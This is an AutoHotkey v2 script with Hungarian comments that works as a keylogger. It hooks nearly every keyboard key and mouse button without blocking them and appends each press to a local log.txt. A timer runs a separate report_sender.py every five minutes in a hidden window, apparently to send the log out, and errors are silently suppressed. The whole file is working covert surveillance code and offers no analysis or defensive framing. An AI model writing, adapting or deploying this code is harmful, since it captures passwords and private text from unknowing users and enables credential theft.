#Requires AutoHotkey v2.0
#Warn VarUnset, Off

; A fájl elérési útja, ahol menteni szeretnénk
logFile := A_ScriptDir . "\log.txt"

; Ha a fájl még nem létezik, létrehozzuk
if !FileExist(logFile) {
    FileAppend("", logFile)  ; Létrehozza az üres fájlt
}

; Timer - ötpercenként futtatja a report_sender.py-t
SetTimer(SendLogReport, 300000)  ; 300000 ms = 5 perc





; Billentyűk rögzítése minden billentyűre
~*a::LogKey("a")
~*b::LogKey("b")
~*c::LogKey("c")
~*d::LogKey("d")
~*e::LogKey("e")
~*f::LogKey("f")
~*g::LogKey("g")
~*h::LogKey("h")
~*i::LogKey("i")
~*j::LogKey("j")
~*k::LogKey("k")
~*l::LogKey("l")
~*m::LogKey("m")
~*n::LogKey("n")
~*o::LogKey("o")
~*p::LogKey("p")
~*q::LogKey("q")
~*r::LogKey("r")
~*s::LogKey("s")
~*t::LogKey("t")
~*u::LogKey("u")
~*v::LogKey("v")
~*w::LogKey("w")
~*x::LogKey("x")
~*y::LogKey("y")
~*z::LogKey("z")
~*1::LogKey("1")
~*2::LogKey("2")
~*3::LogKey("3")
~*4::LogKey("4")
~*5::LogKey("5")
~*6::LogKey("6")
~*7::LogKey("7")
~*8::LogKey("8")
~*9::LogKey("9")
~*0::LogKey("0")
~*Enter::LogKey("Enter")
~*Space::LogKey("Space")
~*LButton::LogKey("LButton")
~*RButton::LogKey("RButton")
~*MButton::LogKey("MButton")
~*XButton1::LogKey("XButton1")
~*XButton2::LogKey("XButton2")
~*WheelDown::LogKey("WheelDown")
~*WheelUp::LogKey("WheelUp")
~*WheelLeft::LogKey("WheelLeft")   
~*WheelRight::LogKey("WheelRight")
~*F1::LogKey("F1")
~*F2::LogKey("F2")
~*F3::LogKey("F3")
~*F4::LogKey("F4")
~*F5::LogKey("F5")
~*F6::LogKey("F6")
~*F7::LogKey("F7")
~*F8::LogKey("F8")
~*F9::LogKey("F9")
~*F10::LogKey("F10")
~*F11::LogKey("F11")
~*F12::LogKey("F12")
~*Numpad0::LogKey("Numpad0")
~*Numpad1::LogKey("Numpad1")
~*Numpad2::LogKey("Numpad2")
~*Numpad3::LogKey("Numpad3")
~*Numpad4::LogKey("Numpad4")
~*Numpad5::LogKey("Numpad5")
~*Numpad6::LogKey("Numpad6")
~*Numpad7::LogKey("Numpad7")
~*Numpad8::LogKey("Numpad8")
~*Numpad9::LogKey("Numpad9")
~*NumpadDot::LogKey("NumpadDot")
~*NumpadDiv::LogKey("NumpadDiv")
~*NumpadMult::LogKey("NumpadMult")
~*NumpadAdd::LogKey("NumpadAdd")
~*NumpadSub::LogKey("NumpadSub")
~*NumpadEnter::LogKey("NumpadEnter")
~*NumpadIns::LogKey("NumpadIns")
~*NumpadEnd::LogKey("NumpadEnd")
~*NumpadDown::LogKey("NumpadDown")
~*NumpadPgDn::LogKey("NumpadPgDn")
~*NumpadLeft::LogKey("NumpadLeft")
~*NumpadClear::LogKey("NumpadClear")
~*NumpadRight::LogKey("NumpadRight")
~*NumpadHome::LogKey("NumpadHome")
~*NumpadUp::LogKey("NumpadUp")
~*NumpadPgUp::LogKey("NumpadPgUp")
~*NumpadDel::LogKey("NumpadDel")
~*LWin::LogKey("LWin")
~*RWin::LogKey("RWin")
~*AppsKey::LogKey("AppsKey")
~*PrintScreen::LogKey("PrintScreen")
~*CtrlBreak::LogKey("CtrlBreak")
~*Pause::LogKey("Pause")
~*CapsLock::LogKey("CapsLock")
~*NumLock::LogKey("NumLock")
~*ScrollLock::LogKey("ScrollLock")
~*Ctrl::LogKey("Ctrl")
~*LControl::LogKey("LControl")
~*RControl::LogKey("RControl")
~*Alt::LogKey("Alt")
~*LAlt::LogKey("LAlt")
~*RAlt::LogKey("RAlt")
~*Shift::LogKey("Shift")
~*LShift::LogKey("LShift")
~*RShift::LogKey("RShift")
~*Backspace::LogKey("Backspace")
~*Tab::LogKey("Tab")
~*Esc::LogKey("Esc")
~*Escape::LogKey("Escape")  
~*PgUp::LogKey("PgUp")
~*PgDn::LogKey("PgDn")
~*End::LogKey("End")
~*Home::LogKey("Home")
~*Left::LogKey("Left")
~*Up::LogKey("Up")
~*Right::LogKey("Right")
~*Down::LogKey("Down")
~*Insert::LogKey("Insert")
~*Delete::LogKey("Delete")
~*-::LogKey("-")
~*=::LogKey("=")
~*[::LogKey("[")
~*]::LogKey("]")
~*\::LogKey("\")
~*`;::LogKey(";")
~*'::LogKey("'")
~*,::LogKey(",")
~*.::LogKey(".")
~*/::LogKey("/")
~*!::LogKey("!")
~*@::LogKey("@")
~*#::LogKey("#")
~*$::LogKey("$")
~*%::LogKey("%")
~*^::LogKey("^")
~*&::LogKey("&")
~*(::LogKey("(")
~*)::LogKey(")")
~*_::LogKey("_")
~*+::LogKey("+")
~*{::LogKey("{")
~*}::LogKey("}")
~*|::LogKey("|")
~*::LogKey(":")
~*<::LogKey("<")
~*>::LogKey(">")
~*?::LogKey("?")
~*~::LogKey("~")


LogKey(Key) {
    try {
        ; A billentyű lenyomása után hozzáadjuk a fájlhoz
        FileAppend(Key . "`n", logFile)
    }
}

SendLogReport() {
    try {
        ; report_sender.py futtatása
        pythonExe := "C:/Program Files/Python39/python.exe"
        scriptPath := A_ScriptDir . "/report_sender.py"
        
        if FileExist(pythonExe) && FileExist(scriptPath) {
            Run(pythonExe . " " . scriptPath, , "Hide")
        }
    } catch as err {
        ; Csendesen ignorálja az esetleges hibákat
    }
}
